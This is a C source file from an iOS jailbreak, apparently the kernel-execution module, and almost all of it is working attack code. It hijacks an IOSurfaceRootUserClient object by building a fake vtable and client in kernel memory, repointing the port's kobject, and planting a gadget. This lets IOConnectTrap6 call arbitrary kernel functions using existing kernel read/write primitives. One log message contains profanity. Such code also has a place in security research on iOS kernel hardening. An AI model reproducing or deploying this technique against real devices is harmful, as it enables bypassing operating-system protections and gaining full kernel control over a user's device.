#include "jailbreak.h"
#include "iokit.h"
#include "kmem.h"
#include "kutils.h"

typedef volatile struct
{
    kptr_t prev;
    kptr_t next;
    kptr_t start;
    kptr_t end;
} kmap_hdr_t;

static mach_port_t user_client;
static kptr_t IOSurfaceRootUserClient_port;
static kptr_t IOSurfaceRootUserClient_addr;
static kptr_t fake_vtable;
static kptr_t fake_client;
static kmap_hdr_t zm_hdr;
const int fake_kalloc_size = 0x1000;

mach_port_t prepare_user_client()
{
    kern_return_t ret = KERN_SUCCESS;
    
    io_service_t service = IOServiceGetMatchingService(kIOMasterPortDefault, IOServiceMatching("IOSurfaceRoot"));

    if (service == MACH_PORT_NULL)
    {
        LOG("failed to open service");
        return MACH_PORT_NULL;
    }
    
    mach_port_t user_client = MACH_PORT_NULL;
    ret = IOServiceOpen(service, mach_task_self(), 0, &user_client);
    LOG("got iosurfaceroot userclient: %x", user_client);
    
    return user_client;
}

kern_return_t init_kexecute(kptr_t zone_map, kptr_t add_ret_gadget)
{
    user_client = prepare_user_client();
    if (user_client == MACH_PORT_NULL)
    {
        LOG("failed to create user client");
        return KERN_FAILURE;
    }
    
    IOSurfaceRootUserClient_port = find_port_address(user_client);
    if (IOSurfaceRootUserClient_port == 0x0)
    {
        LOG("failed to find port address of UC");
        return KERN_FAILURE;
    }
    
    IOSurfaceRootUserClient_addr = rk64(IOSurfaceRootUserClient_port + 0x68); // ipc_port->ip_kobject
    if (IOSurfaceRootUserClient_addr == 0x0)
    {
        LOG("failed to find address of IOSRUC obj");
        return KERN_FAILURE;
    }

    kptr_t IOSurfaceRootUserClient_vtab = rk64(IOSurfaceRootUserClient_addr);
    if (IOSurfaceRootUserClient_vtab == 0x0)
    {
        LOG("failed to find IOSRUC vtab");
        return KERN_FAILURE;
    }

    fake_vtable = kalloc(fake_kalloc_size);
    if (fake_vtable == 0x0)
    {
        LOG("failed to allocate fake vtable of size 0x%x", fake_kalloc_size);
        return KERN_FAILURE;
    }
    
    // copy vtable into userland
    void *local_vtable = malloc(fake_kalloc_size);
    kread(IOSurfaceRootUserClient_vtab, local_vtable, fake_kalloc_size);
    kwrite(fake_vtable, local_vtable, fake_kalloc_size);
    
    fake_client = kalloc(fake_kalloc_size);
    if (fake_client == 0x0)
    {
        LOG("failed to allocate fake client of size 0x%x", fake_kalloc_size);
        return KERN_FAILURE;
    }
    
    void *local_client = malloc(fake_kalloc_size);
    kread(IOSurfaceRootUserClient_addr, local_client, fake_kalloc_size);
    kwrite(fake_client, local_client, fake_kalloc_size);
    
    // replace the vtab with our fake one
    wk64(fake_client + 0x0, fake_vtable);

    wk64(IOSurfaceRootUserClient_port + 0x68, fake_client); // ipc_port->ip_kobject
    
    wk64(fake_vtable + (0x8 * 0xb7), add_ret_gadget + kernel_slide);
    
    // resolve zone map to set up zm_fix_addr
    kptr_t zone_map_addr = rk64(zone_map + kernel_slide);
    if (zone_map_addr == 0x0)
    {
        LOG("wtf, failed to find zone map addr @ offset %llx", zone_map + kernel_slide);
        return KERN_FAILURE;
    }
    
    kread(zone_map_addr + 0x10, (void *)&zm_hdr, sizeof(zm_hdr));
    
    LOG("zone map start: %llx\n", zm_hdr.start);
    LOG("zone map end: %llx\n", zm_hdr.end);
    LOG("zone map size: %llx\n", zm_hdr.end - zm_hdr.start);

    return KERN_SUCCESS;
}

void term_kexecute()
{
    if (IOSurfaceRootUserClient_port != 0x0 &&
        IOSurfaceRootUserClient_addr != 0x0)
    {
        wk64(IOSurfaceRootUserClient_port + 0x68, IOSurfaceRootUserClient_addr); // ipc_port->ip_kobject
    }

    if (fake_vtable != 0)
    {
        kfree(fake_vtable, fake_kalloc_size);
    }

    if (fake_client != 0)
    {
        kfree(fake_client, fake_kalloc_size);
    }
}

kptr_t kexecute(kptr_t addr, int n_args, ...)
{
    if (fake_client == 0x0)
    {
        LOG("tried to kexecute on %llx with %d args when kexecute is not yet set up", addr, n_args);
        return -1;
    }

    if (n_args > 7)
    {
        LOG("no more than 7 args you cheeky fuck");
        return KERN_INVALID_ARGUMENT;
    }

    va_list ap;
    va_start(ap, n_args);

    kptr_t args[7] = { 0 };
    for (int i = 0; i < n_args; i++)
    {
        args[i] = va_arg(ap, kptr_t);
    }

    if (n_args == 0 ||
        args[0] == 0x0)
    {
        args[0] = 0x1;   
    }
    
    wk64(fake_client + 0x40, args[0]);
    wk64(fake_client + 0x48, addr + kernel_slide);
    
    return IOConnectTrap6(user_client, 0, args[1], args[2], args[3], args[4], args[5], args[6]);
}

kptr_t zm_fix_addr(kptr_t addr)
{
    #ifdef __LP64__
    uint64_t zm_tmp = (zm_hdr.start & 0xffffffff00000000) | (addr & 0xffffffff);
    return zm_tmp < zm_hdr.start ? zm_tmp + 0x100000000 : zm_tmp;
    #else 
    return addr;
    #endif
}
